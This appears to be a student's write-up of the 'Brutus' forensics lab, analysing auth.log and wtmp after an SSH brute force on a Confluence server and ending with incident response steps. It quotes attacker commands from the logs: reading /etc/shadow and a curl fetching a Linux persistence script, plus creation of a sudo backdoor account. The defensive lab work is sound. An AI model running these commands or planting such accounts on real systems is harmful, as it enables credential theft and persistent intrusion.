@@ -1,0 +1,46 @@
+Brutus
+In this very easy Sherlock, you will familiarize yourself with Unix auth.log and wtmp logs. We'll explore a scenario where a Confluence server was brute-forced via its SSH service. After gaining access to the server, the attacker performed additional activities, which we can track using auth.log. Although auth.log is primarily used for brute-force analysis, we will delve into the full potential of this artifact in our investigation, including aspects of privilege escalation, persistence, and even some visibility into command execution.
+
+
+
+Resources:
+Auth.log - showed authentication log of failed login / successful login / sudo execution / account creation / account modification
+Wtmp file - system log file used by Unix to record user login and logout activities / user sessions
+
+Tools:
+utmpdump wtmp
+
+last -f wtmp 
+
+Open Auth.log
+
+
+Incident:
+65.2.161.68 carried out a brute force attack on server 172.31.35.28.
+
+After repeated failed login attempts coming from the user, there was a successful login via SSH into the root user of the account. 
+
+The attacker then manually accessed the server on 2024-03-06 06:32:45, creating session ID 37
+
+Within the root account, there was a creation of an account given sudo / elevated privilege titled “cyberjunkie”. This action employed MITRE ATT&CK sub-technique for persistence (T1136.001)
+
+
+The account “cyberjunkie” was then logged into by the attacker, which usd sudo in order to find the following commands:
+
+/usr/bin/cat /etc/shadow
+-The shadow file contains hashed passwords for all usrs on the system, suggesting the attacker tried further to gain access to more sensitive information.
+
+/usr/bin/curl https://raw.githubusercontent.com/montysecurity/linper/main/linper.sh
+-The attacker used curl tool to perform installation of an malicious shell script onto the system. 
+
+Response:
+
+Immediately isolate and contain compromised servers to prevent further lateral movement and data exfiltration.
+
+Terminate all unauthorized sessions, and block the malicious IP.
+
+Disable compromised accounts, and audit the system to determine if other accounts were modified / created.
+
+Remove the malicious script curl’d by the attacker, conduct a system-wide scan, and restore critical system files.
+
+Harden security configurations, apply patches onto the system, enforce strong password renewal. 
